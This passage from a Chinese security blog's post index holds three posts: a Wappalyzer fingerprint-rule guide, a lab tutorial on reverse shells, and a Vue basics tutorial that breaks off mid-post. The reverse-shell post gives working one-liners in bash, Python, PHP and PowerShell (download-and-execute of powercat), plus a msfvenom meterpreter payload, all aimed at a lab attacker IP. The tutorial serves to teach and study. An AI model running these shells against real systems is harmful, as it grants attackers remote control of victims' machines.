<td>10</td>
<td>Analytics</td>
<td>分析统计</td>
<td>例如：Webtrends</td>
</tr>
<tr>
<td>11</td>
<td>Blogs</td>
<td>博客</td>
<td>例如：Typecho</td>
</tr>
<tr>
<td>12</td>
<td>JavaScript Frameworks</td>
<td>JavaScript框架</td>
<td>例如：SoundManager</td>
</tr>
<tr>
<td>13</td>
<td>Issue Trackers</td>
<td>问题跟踪</td>
<td>例如：Redmine</td>
</tr>
<tr>
<td>14</td>
<td>Video Players</td>
<td>视频播放器</td>
<td>例如：Asciinema</td>
</tr>
<tr>
<td>15</td>
<td>Comment Systems</td>
<td>评论系统</td>
<td>例如：Question2Answer</td>
</tr>
<tr>
<td>16</td>
<td>Captchas</td>
<td>验证码</td>
<td>例如：Mollom</td>
</tr>
<tr>
<td>17</td>
<td>Font Scripts</td>
<td>字体脚本</td>
<td>例如：Ionicons</td>
</tr>
<tr>
<td>18</td>
<td>Web Frameworks</td>
<td>Web框架</td>
<td>例如：Includable</td>
</tr>
<tr>
<td>19</td>
<td>Miscellaneous</td>
<td>其它</td>
<td>例如：Twitter Emoji (Twemoji)</td>
</tr>
<tr>
<td>20</td>
<td>Editors</td>
<td>编辑器</td>
<td>例如：FrontPage</td>
</tr>
<tr>
<td>21</td>
<td>LMS</td>
<td>学习管理系统</td>
<td>例如：Dokeos</td>
</tr>
<tr>
<td>22</td>
<td>Web Servers</td>
<td>Web服务</td>
<td>例如：Apache</td>
</tr>
<tr>
<td>23</td>
<td>Cache Tools</td>
<td>缓存工具</td>
<td>例如：wpCache</td>
</tr>
<tr>
<td>24</td>
<td>Rich Text Editors</td>
<td>富文本编辑器</td>
<td>例如：TinyMCE</td>
</tr>
<tr>
<td>25</td>
<td>JavaScript Graphics</td>
<td>JavaScript图形插件</td>
<td>例如：Timeplot</td>
</tr>
<tr>
<td>26</td>
<td>Mobile Frameworks</td>
<td>移动框架</td>
<td>例如：Mobify</td>
</tr>
<tr>
<td>27</td>
<td>Programming Languages</td>
<td>开发语言</td>
<td>例如：Go</td>
</tr>
<tr>
<td>28</td>
<td>Operating Systems</td>
<td>操作系统</td>
<td>例如：Gentoo</td>
</tr>
<tr>
<td>29</td>
<td>Search Engines</td>
<td>搜索引擎</td>
<td>例如：Fact Finder</td>
</tr>
<tr>
<td>30</td>
<td>Web Mail</td>
<td>Web邮件</td>
<td>例如：SquirrelMail</td>
</tr>
<tr>
<td>31</td>
<td>CDN</td>
<td>CDN</td>
<td>例如：Netlify</td>
</tr>
<tr>
<td>32</td>
<td>Marketing Automation</td>
<td>自动化营销</td>
<td>例如：Marketo</td>
</tr>
<tr>
<td>33</td>
<td>Web Server Extensions</td>
<td>Web服务器扩展</td>
<td>例如：mod_wsgi</td>
</tr>
<tr>
<td>34</td>
<td>Databases</td>
<td>数据库</td>
<td>例如：Mysql</td>
</tr>
<tr>
<td>35</td>
<td>Maps</td>
<td>地图</td>
<td>例如：Ushahidi</td>
</tr>
<tr>
<td>36</td>
<td>Advertising Networks</td>
<td>广告网络</td>
<td>例如：Titan</td>
</tr>
<tr>
<td>37</td>
<td>Network Devices</td>
<td>网络设备</td>
<td>例如：Moxa</td>
</tr>
<tr>
<td>38</td>
<td>Media Servers</td>
<td>媒体服务器</td>
<td>例如：MediaTomb</td>
</tr>
<tr>
<td>39</td>
<td>Webcams</td>
<td>网络摄像头</td>
<td>例如：MOBOTIX</td>
</tr>
<tr>
<td>40</td>
<td>Printers</td>
<td>打印机</td>
<td>例如：Dell</td>
</tr>
<tr>
<td>41</td>
<td>Payment Processors</td>
<td>付款处理器</td>
<td>例如：Stripe</td>
</tr>
<tr>
<td>42</td>
<td>Tag Managers</td>
<td>标签管理</td>
<td>例如：Google Tag Manager</td>
</tr>
<tr>
<td>43</td>
<td>Paywalls</td>
<td>付费</td>
<td>例如：Piano Solo</td>
</tr>
<tr>
<td>44</td>
<td>Build CI Systems</td>
<td>持续集成系统</td>
<td>例如：Jenkins</td>
</tr>
<tr>
<td>45</td>
<td>Control Systems</td>
<td>控制系统</td>
<td>例如：Schneider</td>
</tr>
<tr>
<td>46</td>
<td>Remote Access</td>
<td>远程访问</td>
<td>例如：ShellInABox</td>
</tr>
<tr>
<td>47</td>
<td>Dev Tools</td>
<td>开发工具</td>
<td>例如：Phabricator</td>
</tr>
<tr>
<td>48</td>
<td>Network Storage</td>
<td>网络存储</td>
<td>例如：Synology DiskStation</td>
</tr>
<tr>
<td>49</td>
<td>Feed Readers</td>
<td>Feed阅读器</td>
<td>例如：Planet</td>
</tr>
<tr>
<td>50</td>
<td>Document Management Systems</td>
<td>文档管理系统</td>
<td>例如：MHonArc</td>
</tr>
<tr>
<td>51</td>
<td>Landing Page Builders</td>
<td>引导页</td>
<td>例如：ApexPages</td>
</tr>
<tr>
<td>52</td>
<td>Live Chat</td>
<td>在线聊天</td>
<td>例如：Aircall</td>
</tr>
<tr>
<td>53</td>
<td>CRM</td>
<td>客户关系管理</td>
<td>例如：Salesforce</td>
</tr>
<tr>
<td>54</td>
<td>SEO</td>
<td>引擎优化</td>
<td>例如：Yoast SEO</td>
</tr>
<tr>
<td>55</td>
<td>Accounting</td>
<td>会计</td>
<td>例如：Akaunting</td>
</tr>
<tr>
<td>56</td>
<td>Cryptominer</td>
<td>挖矿程序</td>
<td>例如：ProjectPoi</td>
</tr>
<tr>
<td>57</td>
<td>Static Site Generator</td>
<td>静态网站生成器</td>
<td>例如：Hugo</td>
</tr>
<tr>
<td>58</td>
<td>User Onboarding</td>
<td>聊天机器人软件</td>
<td>例如：instabot</td>
</tr>
<tr>
<td>59</td>
<td>JavaScript Libraries</td>
<td>JavaScript库</td>
<td>例如：jQuery</td>
</tr>
<tr>
<td>60</td>
<td>Containers</td>
<td>容器</td>
<td>例如：Docker</td>
</tr>
<tr>
<td>61</td>
<td>SaaS</td>
<td>SaaS</td>
<td>例如：Amazon ECS</td>
</tr>
<tr>
<td>62</td>
<td>PaaS</td>
<td>PaaS</td>
<td>例如：Amazon Web Services</td>
</tr>
<tr>
<td>63</td>
<td>IaaS</td>
<td>IaaS</td>
<td>例如：LocalFocus</td>
</tr>
<tr>
<td>64</td>
<td>Reverse Proxy</td>
<td>反向代理</td>
<td>例如：Nginx</td>
</tr>
<tr>
<td>65</td>
<td>Load Balancer</td>
<td>负载均衡</td>
<td>例如：Amazon ELB</td>
</tr>
<tr>
<td>1000</td>
<td>Service Banner</td>
<td>服务版本</td>
<td>例如：SSH</td>
</tr>
<tr>
<td>1001</td>
<td>Securities Web</td>
<td>证券行业web</td>
<td>例如：thinkive云投顾</td>
</tr>
<tr>
<td>1002</td>
<td>Securities Remote Access</td>
<td>证券行业远程访问</td>
<td>例如：同花顺</td>
</tr>
<tr>
<td>1003</td>
<td>APIs</td>
<td>API接口</td>
<td>例如：RESTful</td>
</tr>
<tr>
<td>1004</td>
<td>Web Management Interface</td>
<td>Web管理端</td>
<td>例如：管理后台</td>
</tr>
<tr>
<td>1005</td>
<td>Router and Switch and VPN</td>
<td>路由器、交换机、VPN</td>
<td>例如：Cisco、Huawei、Sangfor</td>
</tr>
<tr>
<td>1006</td>
<td>Security Application Products</td>
<td>安全应用产品</td>
<td>例如：防火墙、防病毒、上网行为管理等</td>
</tr>
<tr>
<td>1007</td>
<td>Office Software</td>
<td>办公软件</td>
<td>例如：OA、财务软件</td>
</tr>
<tr>
<td>1008</td>
<td>IoT</td>
<td>物联网</td>
<td>例如：IoT设备</td>
</tr>
<tr>
<td>1009</td>
<td>Application Services</td>
<td>应用服务</td>
<td>例如：FTP、Telnet、SSH、RDP等</td>
</tr>
<tr>
<td>1010</td>
<td>Trojan Backdoor</td>
<td>木马后门</td>
<td>例如：Backdoor</td>
</tr>
<tr>
<td>1011</td>
<td>Application Frameworks</td>
<td>应用框架</td>
<td>例如：spring</td>
</tr>
<tr>
<td>1012</td>
<td>Protocols</td>
<td>协议</td>
<td>例如：3CX Tunnel Protocol</td>
</tr>
</tbody></table>
<h3 id="指纹分五层"><a href="#指纹分五层" class="headerlink" title="指纹分五层"></a>指纹分五层</h3><ul>
<li><strong>应用层：</strong>主要是各种web应用系统以及前端js框架等，比如dedecms、xxx应用系统、邮件系统等；</li>
<li><strong>支撑层：</strong>主要是语言、后端框架等，比如java、php、struts、spring等；</li>
<li><strong>服务层：</strong>主要是服务和应用，以及协议，包含openssh、apahce、tomcat、ssl、ntp、icmp等；</li>
<li><strong>系统层：</strong>主要指操作系统，包含Linux、unix、centos、Ubuntu、Windows等；</li>
<li><strong>硬件层：</strong>主要是硬件设备为主，包含路由器、交换机、防火墙、VPN、waf（现在不区分软waf）、以及物联网等设备；</li>
</ul>
<h3 id="基于Wappalyzer的指纹规则说明"><a href="#基于Wappalyzer的指纹规则说明" class="headerlink" title="基于Wappalyzer的指纹规则说明"></a>基于Wappalyzer的指纹规则说明</h3><table>
<thead>
<tr>
<th><strong>字段</strong></th>
<th><strong>涵义说明</strong></th>
<th><strong>备注</strong></th>
</tr>
</thead>
<tbody><tr>
<td>cats</td>
<td>分类，会有多个分类</td>
<td>参见指纹分类表中的分类编号</td>
</tr>
<tr>
<td>icon</td>
<td>匹配软件官方ICO</td>
<td>可以不写</td>
</tr>
<tr>
<td>website</td>
<td>匹配软件官方网站</td>
<td></td>
</tr>
<tr>
<td>implies</td>
<td>推断，例如：存在wordpress，一定会存在php mysql。</td>
<td>可以不写</td>
</tr>
<tr>
<td>excludes</td>
<td>排除，存在一个指纹，就肯定不会存在另外一个指纹。</td>
<td>可以不写</td>
</tr>
<tr>
<td>js</td>
<td>匹配<script></script>之间内容 例如：”js”:{“js_test”: “(.*)\;version:\1”}</td>
<td><script> var js_test = "shuziguanxing"; </script></td>
</tr>
<tr>
<td>headers</td>
<td>匹配response返回的头信息</td>
<td></td>
</tr>
<tr>
<td>html</td>
<td>匹配html返回内容</td>
<td>要求必须精准，否则误报很高</td>
</tr>
<tr>
<td>url</td>
<td>匹配传递URL中的数据</td>
<td>要求必须精准，否则误报很高</td>
</tr>
<tr>
<td>cookies</td>
<td>匹配头信息cookie内容</td>
<td></td>
</tr>
<tr>
<td>meta</td>
<td>匹配<meta>标签中的参数和数据</td>
<td></td>
</tr>
<tr>
<td>scripts</td>
<td><script src="匹配数据"></script></td>
<td></td>
</tr>
<tr>
<td>confidence</td>
<td>信心值，百分制，例如：50</td>
<td>“js”: { “Mage”: “\;confidence:50” }</td>
</tr>
<tr>
<td>version</td>
<td>版本匹配信息</td>
<td>“script”: “jquery-([0-9.]+).js\;version:\1”</td>
</tr>
<tr>
<td>product</td>
<td>产品名称匹配</td>
<td>“html”: “天融信(.*)\;product:\1”,</td>
</tr>
<tr>
<td>子表达式</td>
<td>\1</td>
<td>返回第一个匹配数据</td>
</tr>
<tr>
<td>子表达式</td>
<td>\1?a:</td>
<td>如果第一个匹配数据存在，则返回a，否则返回空</td>
</tr>
<tr>
<td>子表达式</td>
<td>\1?a:b</td>
<td>如果第一个匹配数据存在，则返回a，否则返回b</td>
</tr>
<tr>
<td>子表达式</td>
<td>\1?:b</td>
<td>如果第一个匹配数据存在，则返回空，否则返回b</td>
</tr>
<tr>
<td>子表达式</td>
<td>xxoo\1</td>
<td></td>
</tr>
<tr>
<td>description</td>
<td>指纹应用描述</td>
<td>非必填，比如nginx，<em>Nginx</em> 是一个高性能的HTTP和反向代理web服务器。</td>
</tr>
<tr>
<td>_fingerprint_test_url</td>
<td>测试指纹是否准确的URL</td>
<td>必填项，比如通过网站检测指纹。</td>
</tr>
</tbody></table>
<h2 id="指纹识别编写"><a href="#指纹识别编写" class="headerlink" title="指纹识别编写"></a>指纹识别编写</h2><h3 id="指纹编写"><a href="#指纹编写" class="headerlink" title="指纹编写"></a>指纹编写</h3><ol>
<li>确定web指纹产品</li>
<li>寻找产品样例</li>
<li>分析案例编写规则</li>
</ol>
<figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">"AXUI":&#123;</span><br><span class="line">  "cats":[</span><br><span class="line">      <span class="number">18</span></span><br><span class="line">  ],</span><br><span class="line">  "description":" ax前端框架对一些常用的功能进行集成处理，比如美化滚动条、菜单、cookie等",</span><br><span class="line">  "layer":1,</span><br><span class="line">  "html":[</span><br><span class="line">      "&lt;link [^&gt;]*href=\"[^\"]+\\.*/src/css/ax\\.css",</span><br><span class="line">      <span class="string">"&lt;link [^&gt;]*href=\"[^\"]+\\.*/src/css/ax-response\\.css"</span></span><br><span class="line">  ],    </span><br><span class="line">  "website":"http://www.axui.cn/",</span><br><span class="line">  "scripts":"\\.*/src/js/ax\\.min\\.js",</span><br><span class="line">  "_fingerprint_test_url":"http://www.axui.cn/examples/ax-admin01.php"            </span><br><span class="line">&#125;,</span><br></pre></td></tr></table></figure>

<p><strong>注意事项：</strong> </p>
<ul>
<li>规则匹配实际上是用字符串编写的JavaScript正则表达式</li>
<li>特殊转义<ul>
<li><code>.</code>的需要用两个反斜杠<code>\\.</code>来表达；<code>&quot;</code>需要用一个反斜杆如<code>\&quot;</code>；斜杠<code>/</code>不需要转义</li>
<li>捕获组<code>()</code>用于版本检测，在其他情况下，使用非捕获组<code>(?:)</code>来表达</li>
<li>尽可能使用字符串锚点<code>^</code>和<code>$</code>的开头和结尾</li>
</ul>
</li>
</ul>
<h3 id="指纹测试"><a href="#指纹测试" class="headerlink" title="指纹测试"></a>指纹测试</h3><p>我们写好规则后可以添加到<code>C:\Users\Administrator\AppData\Roaming\npm\node_modules</code>目录下的<code>technologies.json</code>文件中进行测试</p>
<figure class="image-box">
                <img src="https://pic-1303705611.cos.ap-guangzhou.myqcloud.com/typora/img/image-20210108224909184.png" alt="image-20210110212616136" title class>
                <p>image-20210110212616136</p>
            </figure>

<p>添加完成后，我们使用wappalyzer进行测试</p>
<figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">wappalyzer 测试网站</span><br></pre></td></tr></table></figure>

<p>就可以看到返回结果</p>
<figure class="image-box">
                <img src="https://pic-1303705611.cos.ap-guangzhou.myqcloud.com/typora/img/image-20210110212616136.png" alt="image-20210110212723083" title class>
                <p>image-20210110212723083</p>
            </figure>

<h2 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h2><ol>
<li><a href="https://github.com/AliasIO/wappalyzer" target="_blank" rel="noopener">https://github.com/AliasIO/wappalyzer</a></li>
<li><a href="https://fp.shuziguanxing.com/#/fingerplatinfo" target="_blank" rel="noopener">https://fp.shuziguanxing.com/#/fingerplatinfo</a></li>
</ol>
]]></content>
      
        <categories>
            
            <category> 其他 </category>
            
        </categories>
        
        
        <tags>
            
            <tag> 其他 </tag>
            
        </tags>
        
    </entry>
    
    <entry>
      <title><![CDATA[反弹Shell]]></title>
      <url>/2021/01/08/%E5%8F%8D%E5%BC%B9shell/</url>
      <content type="html"><![CDATA[<h1 id="反弹Shell"><a href="#反弹Shell" class="headerlink" title="反弹Shell"></a>反弹Shell</h1><h2 id="原理"><a href="#原理" class="headerlink" title="原理"></a>原理</h2><p><code>反弹shell和telnet，ssh等标准shell对应，就是控制端监听在某TCP/UDP端口，被控端发起请求到该端口，并将其命令行的输入输出转到控制端。</code></p>
<p>反弹shell也可以理解为反向连接，我们日常所使用的telnet、ssh、远程桌面等服务都是正向连接(即我们主动去连接目标)，反弹shell就是让目标主动连接我们。</p>
<p><strong>反弹shell好处</strong></p>
<ul>
<li>防火墙大多数都是防止外部连接内部，利用反弹shell我们可以让服务器从内部连接外部</li>
<li>主动连接端口是固定，有可能被占用，反弹shell端口不固定</li>
<li>反弹shell还有提升权限等好处</li>
</ul>
<h2 id="实验"><a href="#实验" class="headerlink" title="实验"></a>实验</h2><ul>
<li><p>受害机centOs7：192.168.65.137</p>
</li>
<li><p>攻击机kali2020：192.168.65.148</p>
</li>
</ul>
<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#</span>攻击机开启端口监听</span><br><span class="line">nc -lvp 9999</span><br><span class="line"><span class="meta">#</span>nc指的是netcat</span><br><span class="line"><span class="meta">#</span>-l 是listen监听的作用</span><br><span class="line"><span class="meta">#</span>-v 用于输出交互的信息</span><br><span class="line"><span class="meta">#</span>-p 用于监听指定端口</span><br></pre></td></tr></table></figure>

<figure class="image-box">
                <img src="https://pic-1303705611.cos.ap-guangzhou.myqcloud.com/typora/img/1609514196672.png" alt="1609514196672" title class>
                <p>1609514196672</p>
            </figure>

<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#</span>受害机执行反弹命令(自动连接监听的端口)</span><br><span class="line">bash -i &gt;&amp; /dev/tcp/192.168.65.148/9999 0&gt;&amp;1</span><br><span class="line"><span class="meta">#</span>bash -i 用于产生一个交互的shell</span><br><span class="line"><span class="meta">#</span>/dev/tcp/ip/port 作用相当于建立一个sockt连接</span><br></pre></td></tr></table></figure>

<figure class="image-box">
                <img src="https://pic-1303705611.cos.ap-guangzhou.myqcloud.com/typora/img/1609518776337.png" alt="1609514612069" title class>
                <p>1609514612069</p>
            </figure>

<figure class="image-box">
                <img src="https://pic-1303705611.cos.ap-guangzhou.myqcloud.com/typora/img/1609514726946.png" alt="1609514726946" title class>
                <p>1609514726946</p>
            </figure>

<h2 id="说明"><a href="#说明" class="headerlink" title="说明"></a>说明</h2><blockquote>
<ul>
<li><p>&lt;  和  &gt;表示覆盖、&lt;&lt;  和  &gt;&gt;表示追加</p>
</li>
<li><p>0 - stdin 代表标准输入,默认是键盘,使用&lt;或&lt;&lt;</p>
<ul>
<li>1 - stdout 代表标准输出,默认是显示器,使用&gt;或&gt;&gt;</li>
<li>2 - stderr 代表标准错误输出,默认是显示器,使用2&gt;或2&gt;&gt;</li>
</ul>
</li>
<li><p>&amp;&gt;和&gt;&amp;作用一样就是混合输出(标准输出1 + 错误输出2)</p>
<ul>
<li>当后面接文件时，就会把标准输出和标准错误输出重定向至文件</li>
<li>当后面接文件描述符时，就会将前面的文件描述符重定向至后面的文件描述符</li>
</ul>
</li>
</ul>
</blockquote>
<p>了解上面内容之后我们再回顾前面<code>bash -i &gt;&amp; /dev/tcp/192.168.65.148/9999 0&gt;&amp;1</code>中的<code>&amp;&gt;和0&gt;&amp;1</code>的作用</p>
<ul>
<li><p><code>&gt;&amp;</code>就是把标准输出和错误输出都直接重定向到<code>/dev/tcp/192.168.65.148/9999</code>即攻击机</p>
</li>
<li><p><code>0&gt;&amp;1</code>就是把输入的内容重定向到1，而前面<code>&gt;&amp;</code>已经把1内容重定向到<code>/dev/tcp/192.168.65.148/9999</code>,所以输入也重定向到攻击机</p>
</li>
<li><p>即把受害机输入和输出所有内容都直接由攻击机接管</p>
</li>
</ul>
<h2 id="常用的反弹shell"><a href="#常用的反弹shell" class="headerlink" title="常用的反弹shell"></a>常用的反弹shell</h2><h3 id="Bash"><a href="#Bash" class="headerlink" title="Bash"></a>Bash</h3><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">bash -i &gt;&amp; /dev/tcp/192.168.65.148/9999 0&gt;&amp;1</span><br></pre></td></tr></table></figure>

<h3 id="Python"><a href="#Python" class="headerlink" title="Python"></a>Python</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> socket,subprocess,os</span><br><span class="line">s =socket.socket(socket.AF_INET,socket.SOCK_STREAM)</span><br><span class="line">s.connect(( <span class="string">"192.168.65.148"</span>,<span class="number">9999</span>))</span><br><span class="line">os.dup2(s.fileno(),<span class="number">0</span>)</span><br><span class="line">os.dup2(s.fileno(),<span class="number">1</span>)</span><br><span class="line">os.dup2(s.fileno(),<span class="number">2</span>)</span><br><span class="line">p = subprocess.call([ <span class="string">"/bin/bash"</span> , <span class="string">"-i"</span> ])</span><br></pre></td></tr></table></figure>

<h3 id="PowerShell"><a href="#PowerShell" class="headerlink" title="PowerShell"></a>PowerShell</h3><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">powershell IEX (New-ObjectSystem.Net.Webclient).DownloadString(<span class="string">'http://192.168.65.148/powercat.ps1'</span>); </span><br><span class="line"><span class="comment">#需要下载powercat设置好以下准备</span></span><br><span class="line">powercat -c ip_addr -p port -e cmd</span><br></pre></td></tr></table></figure>

<h3 id="PHP"><a href="#PHP" class="headerlink" title="PHP"></a>PHP</h3><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">php -r '$sock=fsockopen("192.168.65.148",9999);exec("/bin/sh -i &lt;&amp;3 &gt;&amp;3 2&gt;&amp;3");'</span><br></pre></td></tr></table></figure>

<h3 id="MSF"><a href="#MSF" class="headerlink" title="MSF"></a>MSF</h3><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">msfvenom -p windows/meterpreter/reverse_tcp LHOST=192.168.65.148 LPORT=9999 -f exe &gt; shell.exe</span><br></pre></td></tr></table></figure>

<h3 id="Cobaltstrike"><a href="#Cobaltstrike" class="headerlink" title="Cobaltstrike"></a>Cobaltstrike</h3><figure class="image-box">
                <img src="https://pic-1303705611.cos.ap-guangzhou.myqcloud.com/typora/img/1609514612069.png" alt="1609518776337" title class>
                <p>1609518776337</p>
            </figure>

<h2 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h2><p><a href="https://xz.aliyun.com/t/2549#toc-5" target="_blank" rel="noopener">https://xz.aliyun.com/t/2549#toc-5</a></p>
<p><a href="https://mp.weixin.qq.com/s/baVYUY1kEL0T8SprCX5N_Q" target="_blank" rel="noopener">https://mp.weixin.qq.com/s/baVYUY1kEL0T8SprCX5N_Q</a></p>
<p><a href="https://mp.weixin.qq.com/s/KbdCqujuOgfdbYsa7d3BLw" target="_blank" rel="noopener">https://mp.weixin.qq.com/s/KbdCqujuOgfdbYsa7d3BLw</a></p>
<p><a href="https://blog.csdn.net/zhaominpro/article/details/82630528" target="_blank" rel="noopener">https://blog.csdn.net/zhaominpro/article/details/82630528</a></p>
<p><a href="https://mp.weixin.qq.com/s/L5EcXCuohrjejbNV_MjDXw" target="_blank" rel="noopener">https://mp.weixin.qq.com/s/L5EcXCuohrjejbNV_MjDXw</a></p>
]]></content>
      
        <categories>
            
            <category> 安全 </category>
            
        </categories>
        
        
        <tags>
            
            <tag> 安全 </tag>
            
        </tags>
        
    </entry>
    
    <entry>
      <title><![CDATA[vue基础]]></title>
      <url>/2020/03/26/vue%E5%9F%BA%E7%A1%80/</url>
      <content type="html"><![CDATA[<h1 id="Vue基础"><a href="#Vue基础" class="headerlink" title="Vue基础"></a>Vue基础</h1><p>模板：</p>
<p>data用于定义属性。</p>
<p>methods 用于定义的函数，可以通过 return 来返回函数值。</p>
<p>&lt;!–￼77–&gt; 用于输出对象属性和函数返回值。</p>
<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;!DOCTYPE html&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">html</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">head</span>&gt;</span></span><br><span class="line">	<span class="tag">&lt;<span class="name">meta</span> <span class="attr">charset</span>=<span class="string">"utf-8"</span>&gt;</span></span><br><span class="line">	<span class="tag">&lt;<span class="name">title</span>&gt;</span>Vue 测试实例<span class="tag">&lt;/<span class="name">title</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">!导包</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">style</span>&gt;</span>    </span><br><span class="line">     [v-cloak]&#123;</span><br><span class="line">        dispaly:none;</span><br><span class="line">    &#125;  </span><br><span class="line">    <span class="tag">&lt;/<span class="name">style</span>&gt;</span></span><br><span class="line">	<span class="tag">&lt;<span class="name">script</span> <span class="attr">src</span>=<span class="string">"https://cdn.staticfile.org/vue/2.4.2/vue.min.js"</span>&gt;</span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">head</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">body</span>&gt;</span></span><br><span class="line">	<span class="tag">&lt;<span class="name">div</span> <span class="attr">id</span>=<span class="string">"app"</span>&gt;</span> </span><br><span class="line">		<span class="tag">&lt;<span class="name">p</span>&gt;</span>&#123;&#123;msg&#125;&#125;<span class="tag">&lt;/<span class="name">p</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">p</span> <span class="attr">v-cloak</span>&gt;</span>&#123;&#123;msg&#125;&#125;<span class="tag">&lt;/<span class="name">p</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">p</span> <span class="attr">v-text</span>=<span class="string">"msg"</span>&gt;</span><span class="tag">&lt;/<span class="name">p</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">"button"</span> <span class="attr">value</span>=<span class="string">"按钮"</span> <span class="attr">v-bind:title</span>=<span class="string">"msg"</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">"button"</span> <span class="attr">value</span>=<span class="string">"按钮"</span> <span class="attr">v-bind:title</span>=<span class="string">"msg"</span> <span class="attr">v-on:click</span>=<span class="string">"show"</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">script</span>&gt;</span></span><br><span class="line"><span class="javascript">    	<span class="keyword">var</span> vm = <span class="keyword">new</span> Vue(&#123;<span class="comment">//创建vue对象</span></span></span><br><span class="line"><span class="javascript">    		el: <span class="string">'#app'</span>,<span class="comment">//引用组件</span></span></span><br><span class="line"><span class="javascript">    		data: &#123;<span class="comment">//数据</span></span></span><br><span class="line"><span class="javascript">    			msg: <span class="string">"wisejay"</span></span></span><br><span class="line">    		&#125;,</span><br><span class="line"><span class="javascript">    		methods: &#123;<span class="comment">//方法</span></span></span><br><span class="line"><span class="javascript">    			show: <span class="function"><span class="keyword">function</span>(<span class="params"></span>) </span>&#123;</span></span><br><span class="line"><span class="javascript">    				alert(<span class="string">"123"</span>)</span></span><br><span class="line">    			&#125;</span><br><span class="line">    		&#125;</span><br><span class="line">    	&#125;)</span><br><span class="line">    <span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">html</span>&gt;</span></span><br></pre></td></tr></table></figure>

<ul>
<li>v-cloak</li>
</ul>
<p>解决插入值表达式的闪烁问题</p>
<p>标签内可以追加其他内容</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">&lt;style&gt;</span><br><span class="line">    [v-cloak]&#123;</span><br><span class="line">        dispaly:none;</span><br><span class="line">    &#125;</span><br><span class="line">&lt;/style&gt;</span><br><span class="line">&lt;body&gt;</span><br><span class="line">    &lt;p v-cloak&gt;&#123;&#123;msg&#125;&#125;&lt;/p&gt;</span><br><span class="line">&lt;/body&gt;</span><br></pre></td></tr></table></figure>

<ul>
<li>v-text</li>
</ul>
<p>默认没有闪烁，但会覆盖元素中原本内容</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">&lt;body&gt;</span><br><span class="line">    &lt;p v-text=&quot;msg&quot;&gt;&lt;/p&gt;</span><br><span class="line">&lt;/body&gt;</span><br></pre></td></tr></table></figure>

<ul>
<li>v-html</li>
</ul>
<p>当作html输出</p>
